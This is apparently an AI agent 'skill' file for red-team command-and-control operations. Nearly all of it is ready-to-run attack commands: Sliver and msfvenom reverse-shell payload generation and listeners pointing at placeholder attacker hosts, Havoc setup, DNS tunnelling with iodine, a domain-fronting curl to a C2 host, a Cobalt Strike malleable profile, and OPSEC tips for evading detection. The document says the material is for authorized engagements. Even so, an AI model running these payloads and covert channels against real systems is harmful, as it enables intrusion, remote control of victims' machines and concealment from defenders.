---
name: c2-operations
description: Command and Control infrastructure setup, payload generation, and covert communication channels for authorized red team operations.
---

# C2 Operations Skill

## When to Use
Use this skill for setting up and managing Command and Control infrastructure during authorized red team engagements.

## Infrastructure Setup

### Sliver C2
```bash
# Generate payload
sliver-server generate --os windows --arch amd64 --save /tmp/payload.exe

# Start listener
sliver-server

# In Sliver console
listeners --http --port 80
stage --protocol http --host <attacker_ip> --port 80
```

### Havoc C2
```bash
# Server
havoc server --profile ./havoc.yaotl

# Client
havoc client
```

### Metasploit
```bash
# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o payload.exe

# Handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT 4444; exploit"
```

## Covert Communication

### DNS Tunneling
```bash
# Iodine
iodined -f 10.0.0.1 tunnel.domain.com

# Client
iodine -f tunnel.domain.com
```

### Domain Fronting
```bash
# Use CDN as front
curl -H "Host: cdn-target.com" https://actual-c2.com/beacon
```

### HTTPS Malleable C2
```
# Cobalt Strike profile
set global_timeout "30";
set jitter       "15";
http-post {
    set uri "/submit.php";
    client {
        header "Content-Type: " "application/x-www-form-urlencoded";
        metadata {
            mask;
            base64;
            prepend "data=";
        }
    }
    server {
        output {
            print;
        }
    }
}
```

## OPSEC Guidelines
1. Use unique infrastructure per engagement
2. Implement domain fronting for C2 channels
3. Use encrypted communications (HTTPS, DNS-over-HTTPS)
4. Rotate infrastructure regularly
5. Monitor for detection and adapt
